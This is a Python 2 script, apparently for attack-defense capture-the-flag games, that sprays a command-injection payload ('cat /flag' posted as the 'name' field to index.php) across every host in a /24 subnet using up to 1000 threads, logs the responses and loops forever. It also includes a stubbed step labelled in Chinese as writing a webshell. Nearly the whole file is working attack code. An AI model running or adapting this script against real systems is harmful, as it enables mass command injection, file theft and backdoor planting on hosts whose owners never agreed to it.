#!/usr/bin/env python
# encoding: utf-8
 
import requests
import urllib
import time
import threading
 
#批量Get_Flag
def init1():
    global headers123
    headers1243 = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.1; ',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded',  # 保证post数据
        'Cookie': 'PHPSESSID = di3qm91mb32ni47sbqmqg6rgt7;'
        # 'Referer': 'https://www.baidu.com',
    }
 
 
def ip_list():
    global ip1
    ip1 = []
    for a in range(2,255):
        #i = "172.20" + "." + str(a)+".101"
        i = "192.168.132."+str(a)
        ip1.append(i)
 
def get_flag(str1):
    s1 = str1.find('flag{')
    flag = str1[s1:s1 + 6 + 32]
 
 
def main():
    pass
 
 
 
 
 
def attack(ip):
 
    cookie='PHPSESSID=di3qm92mb33ni57sbqmqg6rgt7;'
 
    #----------------获取flag------------------------------------
    header1 = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.1; ',
        'Cache-Control': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded',  # 保证post数据
        'Cookie': cookie
        # 'Referer': 'https://www.baidu.com',
    }
    url_payload = 'index.php'
    url = 'http://' + str(ip) + '/' + url_payload
 
    cmd = 'cat /flag'
 
    #执行系统命令要用system函数
    post_data = 'name='+cmd
    
    try:
        content= requests.post(url,headers=header1,data=post_data,timeout=3)
 
        flag = content.text
        print flag
        #flag = str(flag)
        print "-----------------------------------------"
        flag = flag.replace("<","")
        flag = flag.replace(">","")
        flag = flag.replace("/","")
        flag = flag.replace("\"","")
        ip_log('flag2.txt',flag)
        #return content.text
    except Exception as e:
        #print str(ip) + ":Time out!"
        pass
 
 
 
 
    #------写马--------------------------------------
  
    #马的内容
    cmd='xxx'
    post_data = 'name='+cmd
    try:
        content= requests.post(url,headers=header1,data=post_data,timeout=3)
        #print content.text
        #return content.text
    except Exception as e:
        #print str(ip) + str(e)
        pass
 
 
 
 
 
def ip_log(txt_name,content):
    try:
        f1 = open(txt_name, 'a')
        f1.write(content + "\r\n")
        f1.close()
    except Exception, e:
        print str(e)
        pass
 
 
if __name__ == '__main__':
 
    #设置上限线程数
    threads=1000
 
    #主机地址 作为回弹
    ip_host="192.168.132.11"
 
    #初始化ip列表，列表名为ip1
    ip_list()
 
    #main()
    while 1:
        for ip in ip1:
            #print ip
            # 当线程过高，休息一会儿
            while (threading.activeCount() > threads):
                time.sleep(1)
           # print threading.activeCount()
            t1 = threading.Thread(target=attack, args=(ip,))
            t1.start()
            #t1.join(3)  # 3秒超时，但这个不能在最外层用，会拖慢线程
        #exit()
    print "结束"
    #其实get的也可以只用post的方式